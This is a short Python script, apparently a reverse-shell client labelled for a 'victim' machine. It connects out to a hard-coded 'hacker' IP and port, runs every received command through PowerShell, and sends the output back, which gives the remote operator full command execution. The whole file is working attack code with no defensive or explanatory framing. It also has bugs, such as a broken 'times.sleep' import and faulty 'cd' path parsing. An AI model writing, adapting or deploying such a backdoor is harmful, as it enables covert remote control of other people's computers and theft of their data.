from os import times
import os
import socket
import subprocess

hacker_IP = '192.168.43.138'
hacker_PORT = 8008
IDENTIFIER = "<END_OF_COMMAND_RESULT>"

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_address = (hacker_IP,hacker_PORT)
victim_socket.connect(socket_address)
while True:
    try:
        while True:
            data = victim_socket.recv(1024)
            hacker_command = data.decode()
            if hacker_command == "stop":
                break
            elif hacker_command.startswith("cd"):
                path2move = hacker_command.strip("cd ")
                if os.path.exists(path2move):
                    os.chdir(path2move)
                else:
                    print("Cant change the path: ",path2move)
                    continue
            else:
                output = subprocess.run(["powershell.exe",hacker_command],shell = True,capture_output = True)
                if output.stderr.decode("utf-8") == "":
                    command_result = output.stdout
                    command_result = command_result.decode("utf-8") + IDENTIFIER
                    command_result = command_result.encode("utf-8")
                else:
                    command_result = output.stderr
                victim_socket.sendall(command_result)
    except KeyboardInterrupt:
        print("Exiting.......")
    except Exception as err:
        print("Unable to connect: ",err)
        times.sleep(5)
